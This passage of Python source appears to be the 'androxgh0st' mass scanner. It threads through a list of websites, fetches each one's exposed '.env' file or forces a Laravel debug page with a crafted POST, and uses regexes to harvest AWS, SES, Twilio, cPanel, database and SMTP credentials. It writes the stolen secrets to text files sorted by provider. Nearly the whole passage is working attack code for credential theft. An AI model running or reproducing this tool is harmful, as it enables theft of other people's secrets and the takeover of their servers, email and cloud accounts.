            aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]

          except:

            aws_sec = ''

          try:

            asu = androxgh0st().get_aws_region(text)

            if asu:

              aws_reg = asu

            else:

              aws_reg = ''

          except:

            aws_reg = ''

        elif "<td>AWS_ACCESS_KEY_ID</td>" in text:

          method = 'debug'

          try:

            aws_key = reg(r"<td>AWS_ACCESS_KEY_ID</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_key = ''

          try:

            aws_sec = reg(r"<td>AWS_SECRET_ACCESS_KEY</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_sec = ''

          try:

            asu = androxgh0st().get_aws_region(text)

            if asu:

              aws_reg = asu

            else:

              aws_reg = ''

          except:

            aws_reg = ''

        if aws_reg == "":

          aws_reg = "aws_unknown_region--"

        if aws_key == "" and aws_sec == "":

          return False

        else:

          build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '

          remover = str(build).replace('\r', '')

          save = open(_res(''+str(aws_reg)[:-2]+'.txt'), 'a')

          save.write(remover+'\n\n')

          save.close()

          remover = str(build).replace('\r', '')

          save2 = open(_res('AWS_KEY.txt'), 'a')

          save2.write(remover+'\n\n')

          save2.close()

        return True

      elif "AWS_KEY" in text:

        if "AWS_KEY=" in text:

          method = '/.env'

          try:

            aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]

          except:

            aws_key = ''

          try:

            aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]

          except:

            aws_sec = ''

          try:

            asu = androxgh0st().get_aws_region(text)

            if asu:

              aws_reg = asu

            else:

              aws_reg = ''

          except:

            aws_reg = ''

          try:

            aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]

          except:

            aws_buc = ''

        elif "<td>AWS_KEY</td>" in text:

          method = 'debug'

          try:

            aws_key = reg(r"<td>AWS_KEY</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_key = ''

          try:

            aws_sec = reg(r"<td>AWS_SECRET</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_sec = ''

          try:

            asu = androxgh0st().get_aws_region(text)

            if asu:

              aws_reg = asu

            else:

              aws_reg = ''

          except:

            aws_reg = ''

          try:

            aws_buc = reg(r"<td>AWS_BUCKET</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_buc = ''

        if aws_reg == "":

          aws_reg = "aws_unknown_region--"

        if aws_key == "" and aws_sec == "":

          return False

        else:

          build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '+str(aws_buc)

          remover = str(build).replace('\r', '')

          save = open(_res(''+str(aws_reg)[:-2]+'.txt'), 'a')

          save.write(remover+'\n\n')

          save.close()

          remover = str(build).replace('\r', '')

          save2 = open(_res('AWS_KEY.txt'), 'a')

          save2.write(remover+'\n\n')

          save2.close()

        return True

      elif "SES_KEY" in text:

        if "SES_KEY=" in text:

          method = '/.env'

          try:

             aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]

          except:

            aws_key = ''

          try:

            aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]

          except:

            aws_sec = ''

          try:

            asu = androxgh0st().get_aws_region(text)

            if asu:

              aws_reg = asu

            else:

              aws_reg = ''

          except:

            aws_reg = ''

        elif "<td>SES_KEY</td>" in text:

          method = 'debug'

          try:

            aws_key = reg(r"<td>SES_KEY</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_key = ''

          try:

            aws_sec = reg(r"<td>SES_SECRET</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            aws_sec = ''

          try:

            asu = androxgh0st().get_aws_region(text)

            if asu:

              aws_reg = asu

            else:

              aws_reg = ''

          except:

            aws_reg = ''

        if aws_reg == "":

          aws_reg = "aws_unknown_region--"

        if aws_key == "" and aws_sec == "":

          return False

        else:

          build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nAWS ACCESS KEY: '+str(aws_key)+'\nAWS SECRET KEY: '+str(aws_sec)+'\nAWS REGION: '+str(aws_reg)+'\nAWS BUCKET: '

          remover = str(build).replace('\r', '')

          save = open(_res(''+str(aws_reg)[:-2]+'.txt'), 'a')

          save.write(remover+'\n\n')

          save.close()

          remover = str(build).replace('\r', '')

          save2 = open(_res('AWS_KEY.txt'), 'a')

          save2.write(remover+'\n\n')

          save2.close()

        return True

      else:

        return False

    except:

      return False


  def get_twillio(self, text, url):

    try:

      if "TWILIO" in text:

        if "TWILIO_ACCOUNT_SID=" in text:

          method = '/.env'

          try:

            acc_sid = reg('\nTWILIO_ACCOUNT_SID=(.*?)\n', text)[0]

          except:

            acc_sid = ''

          try:

            acc_key = reg('\nTWILIO_API_KEY=(.*?)\n', text)[0]

          except:

            acc_key = ''

          try:

            sec = reg('\nTWILIO_API_SECRET=(.*?)\n', text)[0]

          except:

            sec = ''

          try:

            chatid = reg('\nTWILIO_CHAT_SERVICE_SID=(.*?)\n', text)[0]

          except:

            chatid = ''

          try:

            phone = reg('\nTWILIO_NUMBER=(.*?)\n', text)[0]

          except:

            phone = ''

          try:

            auhtoken = reg('\nTWILIO_AUTH_TOKEN=(.*?)\n', text)[0]

          except:

            auhtoken = ''

        elif '<td>TWILIO_ACCOUNT_SID</td>' in text:

          method = 'debug'

          try:

            acc_sid = reg(r'<td>TWILIO_ACCOUNT_SID</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            acc_sid = ''

          try:

            acc_key = reg(r'<td>TWILIO_API_KEY</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            acc_key = ''

          try:

            sec = reg(r'<td>TWILIO_API_SECRET</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            sec = ''

          try:

            chatid = reg(r'<td>TWILIO_CHAT_SERVICE_SID</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            chatid = ''

          try:

            phone = reg(r'<td>TWILIO_NUMBER</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            phone = ''

          try:

            auhtoken = reg(r'<td>TWILIO_AUTH_TOKEN</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            auhtoken = ''

        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nTWILIO_ACCOUNT_SID: '+str(acc_sid)+'\nTWILIO_API_KEY: '+str(acc_key)+'\nTWILIO_API_SECRET: '+str(sec)+'\nTWILIO_CHAT_SERVICE_SID: '+str(chatid)+'\nTWILIO_NUMBER: '+str(phone)+'\nTWILIO_AUTH_TOKEN: '+str(auhtoken)

        remover = str(build).replace('\r', '')

        save = open(_res('TWILLIO.txt'), 'a')

        save.write(remover+'\n\n')

        save.close()

        return True

      elif "ACCOUNT_SID" in text:

        if "ACCOUNT_SID=" in text:

          method = '/.env'

          try:

            tiwi_1 = reg("\nACCOUNT_SID=(.*?)\n", text)[0]

          except:

            tiwi_1 = ''

          try:

            tiwi_2 = reg("\nAUTH_TOKEN=(.*?)\n", text)[0]

          except:

            tiwi_2 = ''

          try:

            tiwi_3 = reg("\nTwilio_Number=(.*?)\n", text)[0]

          except:

            tiwi_3 = ''

        elif "<td>ACCOUNT_SID</td>" in text:

          method = 'debug'

          try:

            tiwi_1 = reg(r"<td>ACCOUNT_SID</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            tiwi_1 = ''

          try:

            tiwi_2 = reg(r"<td>AUTH_TOKEN</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            tiwi_2 = ''

          try:

            tiwi_3 = reg(r"<td>Twilio_Number</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            tiwi_3 = ''

        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nACCOUNT_SID: '+str(tiwi_1)+'\nAUTH_TOKEN: '+str(tiwi_2)+'\nTwilio_Number: '+str(tiwi_3)

        remover = str(build).replace('\r', '')

        save = open(_res('TWILLIO.txt'), 'a')

        save.write(remover+'\n\n')

        save.close()

        return True

      else:

        return False

    except:

      return False


  def get_cpanel(self, text, url):

    try:

      if "CPANEL_" in text:

        if "CPANEL_HOST=" in text:

          method = '/.env'

          try:

            cipanel_host = reg('\nCPANEL_HOST=(.*?)\n', text)[0]

          except:

            cipanel_host = ''

          try:

            cipanel_port = reg('\nCPANEL_PORT=(.*?)\n', text)[0]

          except:

            cipanel_port = ''

          try:

            cipanel_user = reg('\nCPANEL_USERNAME=(.*?)\n', text)[0]

          except:

            cipanel_user = ''

          try:

            cipanel_pw = reg('\nCPANEL_PASSWORD=(.*?)\n', text)[0]

          except:

            cipanel_pw = ''

        elif '<td>CPANEL_HOST</td>' in text:

          method = 'debug'

          try:

            cipanel_host = reg(r'<td>CPANEL_HOST</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            cipanel_host = ''

          try:

            cipanel_port = reg(r'<td>CPANEL_PORT</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            cipanel_port = ''

          try:

            cipanel_user = reg(r'<td>CPANEL_USERNAME</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            cipanel_user = ''

          try:

            cipanel_pw = reg(r'<td>CPANEL_PASSWORD</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            cipanel_pw = ''

        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nCPANEL_HOST: '+str(cipanel_host)+'\nCPANEL_PORT: '+str(cipanel_port)+'\nCPANEL_USERNAME: '+str(cipanel_user)+'\nCPANEL_PASSWORD: '+str(cipanel_pw)

        remover = str(build).replace('\r', '')

        save = open(_res('CPANEL.txt'), 'a')

        save.write(remover+'\n\n')

        save.close()

        return True

      else:

        return False

    except:

      return False


  def get_database(self, text, url):

    try:

      if "DB_" in text:

        if "DB_HOST=" in text:

          method = '/.env'

          try:

            debe_host = reg('\nDB_HOST=(.*?)\n', text)[0]

          except:

            debe_host = ''

          try:

            debe_name = reg('\nDB_DATABASE=(.*?)\n', text)[0]

          except:

            debe_name = ''

          try:

            debe_user = reg('\nDB_USERNAME=(.*?)\n', text)[0]

          except:

            debe_user = ''

          try:

            debe_pw = reg('\nDB_PASSWORD=(.*?)\n', text)[0]

          except:

            debe_pw = ''

        elif '<td>DB_HOST</td>' in text:

          method = 'debug'

          try:

            debe_host = reg(r'<td>DB_HOST</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            debe_host = ''

          try:

            debe_name = reg(r'<td>DB_DATABASE</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            debe_name = ''

          try:

            debe_user = reg(r'<td>DB_USERNAME</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            debe_user = ''

          try:

            debe_pw = reg(r'<td>DB_PASSWORD</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          except:

            debe_pw = ''

        build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nDB_HOST: '+str(debe_host)+'\nDB_DATABASE: '+str(debe_name)+'\nDB_USERNAME: '+str(debe_user)+'\nDB_PASSWORD: '+str(debe_pw)

        remover = str(build).replace('\r', '')

        save = open(_res('DATABASE.txt'), 'a')

        save.write(remover+'\n\n')

        save.close()

        return True

      else:

        return False

    except:

      return False


  def get_smtp(self, text, url):

    try:

      if "MAIL_HOST" in text:

        if "MAIL_HOST=" in text:

          method = '/.env'

          mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]

          mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]

          mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]

          mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]

          try:

            mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]

          except:

            mailfrom = ''

          try:

            fromname = reg(r"\MAIL_FROM_NAME=(.*?)\n", text)[0]

          except:

            fromname = ''

        elif "<td>MAIL_HOST</td>" in text:

          method = 'debug'

          mailhost = reg(r'<td>MAIL_HOST</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          mailport = reg(r'<td>MAIL_PORT</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          mailuser = reg(r'<td>MAIL_USERNAME</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          mailpass = reg(r'<td>MAIL_PASSWORD</td>\s+<td><pre.*>(.*?)</span>', text)[0]

          try:

            mailfrom = reg(r"<td>MAIL_FROM_ADDRESS</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            mailfrom = ''

          try:

            fromname = reg(r"<td>MAIL_FROM_NAME</td>\s+<td><pre.*>(.*?)</span>", text)[0]

          except:

            fromname = ''

        if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":

          return False

        else:

          # mod aws

          if '.amazonaws.com' in mailhost:

            getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res(''+getcountry[:-2]+'.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

            remover = str(build).replace('\r', '')

            save2 = open(_res('smtp_aws.txt'), 'a')

            save2.write(remover+'\n\n')

            save2.close()

          elif 'sendgrid' in mailhost:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('sendgrid.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          elif 'office365' in mailhost:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('office.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          elif '1and1' in mailhost or '1und1' in mailhost:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('1and1.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          elif 'zoho' in mailhost:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('zoho.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          elif 'mandrillapp' in mailhost:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('mandrill.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          elif 'mailgun' in mailhost:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('mailgun.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          else:

            build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nMAILHOST: '+str(mailhost)+'\nMAILPORT: '+str(mailport)+'\nMAILUSER: '+str(mailuser)+'\nMAILPASS: '+str(mailpass)+'\nMAILFROM: '+str(mailfrom)+'\nFROMNAME: '+str(fromname)

            remover = str(build).replace('\r', '')

            save = open(_res('SMTP_RANDOM.txt'), 'a')

            save.write(remover+'\n\n')

            save.close()

          return True

      else:

        return False

    except:

      return False


def printf(text):

  ''.join([str(item) for item in text])

  print((text + '\n'), end=' ')


def main(url):

  resp = False

  try:

    text = '\033[32;1m#\033[0m '+url

    headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}

    get_source = requests.get(url+"/.env", headers=headers, timeout=5, verify=False, allow_redirects=False).text

    if "APP_KEY=" in get_source:

      resp = get_source

    else:

      get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text

      if "<td>APP_KEY</td>" in get_source:

        resp = get_source

    if resp:

      getsmtp = androxgh0st().get_smtp(resp, url)

      getwtilio = androxgh0st().get_twillio(resp, url)

      getaws = androxgh0st().get_aws_data(resp, url)

      getnexmo = androxgh0st().nexmo(resp, url)

      getstripe = androxgh0st().stripe(resp, url)

      getcpanel = androxgh0st().get_cpanel(resp, url)

      getdebe = androxgh0st().get_database(resp, url)

      if getsmtp:

        text += ' | \033[32;1mSMTP credentials found (likely low-value).\033[0m'

      else:

        text += ' | \033[31;1mNo email credentials found.\033[0m'

      if getaws:

        text += ' | \033[32;1mAWS keys found!\033[0m'

      else:

        text += ' | \033[31;1mNo AWS keys found.\033[0m'

      if getwtilio:

        text += ' | \033[32;1mTwilio keys found.\033[0m'

      else:

        text += ' | \033[31;1mNo Twilio keys found.\033[0m'

      if getnexmo:

        text += ' | \033[32;1mNexmo keys found.\033[0m'

      else:

        text += ' | \033[31;1mNo Nexmo keys found.\033[0m'

      if getstripe:

        text += ' | \033[32;1mStripe keys found (potentially usable).\033[0m'

      else:

        text += ' | \033[31;1mNo Stripe keys found.\033[0m'

      if getcpanel:

        text += ' | \033[32;1mcPanel credentials found (verify manually).\033[0m'

      else:

        text += ' | \033[31;1mNo cPanel credentials found.\033[0m'

      if getdebe:

        text += ' | \033[32;1mDatabase credentials found.\033[0m'

      else:

        text += ' | \033[31;1mNo database credentials found.\033[0m'

    else:

      text += ' | \033[31;1mNo exposure detected on this host.\033[0m'

      save = open(_res('Live_site.txt'),'a')

      asu = str(url).replace('\r', '')

      save.write(asu+'\n')

      save.close()

      androxgh0st().AWSLO(url)

      

  except Exception as e:

    text = '\033[31;1m#\033[0m '+url

    text += ' | \033[31;1mHost appears down or unreachable.\033[0m'


    #asu = str(url).replace('\r', '')

  #remove_line(url)

  printf(text)


def remove_line(ss):

  detroit = lists

  ken= ss+"/"

  aa = open(detroit, 'r', encoding='utf-8').read()

  trim = aa.replace(ken, "")

  #print(trim)

  asu = str(trim).replace('\r', '')

  reples = open(detroit, 'w', encoding='utf-8').write(trim)



if __name__ == '__main__':
  os.system('cls' if os.name == 'nt' else 'clear')
  print_ascii()
  os.system('cls' if os.name == 'nt' else 'clear')
  print_ascii()
  try:

    readcfg = ConfigParser()

    readcfg.read(pid_restore)

    lists = readcfg.get('DB', 'FILES')

    numthread = readcfg.get('DB', 'THREAD')

    sessi = readcfg.get('DB', 'SESSION')

    print("Session log found — restore")

    print(('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi))

    tanya = ask("Continue session? [Y/n]: ")

    if "Y" in tanya or "y" in tanya:

      lerr = open(lists).read().split("\n"+sessi)[1]

      readsplit = lerr.splitlines()

    else:

      pass # Send Error Biar Lanjut Ke Wxception :v

  except:

    try:

      lists = sys.argv[1]

      numthread = sys.argv[2]

      readsplit = open(lists).read().splitlines()

    except:

      try:

        lists = ask("Provide your list file (e.g., url.txt): ")

        readsplit = open(lists).read().splitlines()

      except:

        print("Wrong input or list not found!")

        exit()

      try:

        numthread = ask("Threads (e.g., 10): ")

      except:

        print("Wrong thread number!")

        exit()

  pool = ThreadPool(int(numthread))

  for url in readsplit:

    # Clean the URL first
    original_url = url.strip()
    
    if "://" in original_url:
      # If URL already has protocol, use as is
      url_to_scan = original_url
      if url_to_scan.endswith('/'):
        url_to_scan = url_to_scan[:-1]
      
      jagases = url_to_scan
      try:
        pool.add_task(main, url_to_scan)
      except KeyboardInterrupt:
        session = open(pid_restore, 'w')
        cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
        session.write(cfgsession)
        session.close()
        print("CTRL+C detected — session saved")
        exit()
    else:
      # If no protocol, scan both HTTP and HTTPS for better accuracy
      
      # Scan HTTP version
      http_url = "http://"+original_url
      if http_url.endswith('/'):
        http_url = http_url[:-1]
      
      jagases = http_url
      try:
        pool.add_task(main, http_url)
      except KeyboardInterrupt:
        session = open(pid_restore, 'w')
        cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
        session.write(cfgsession)
        session.close()
        print("CTRL+C detected — session saved")
        exit()
      
      # Scan HTTPS version  
      https_url = "https://"+original_url
      if https_url.endswith('/'):
        https_url = https_url[:-1]
      
      jagases = https_url
      try:
        pool.add_task(main, https_url)
      except KeyboardInterrupt:
        session = open(pid_restore, 'w')
        cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
        session.write(cfgsession)
        session.close()
        print("CTRL+C detected — session saved")
        exit()

  pool.wait_completion()

  try:

    os.remove(pid_restore)

  except:

    pass
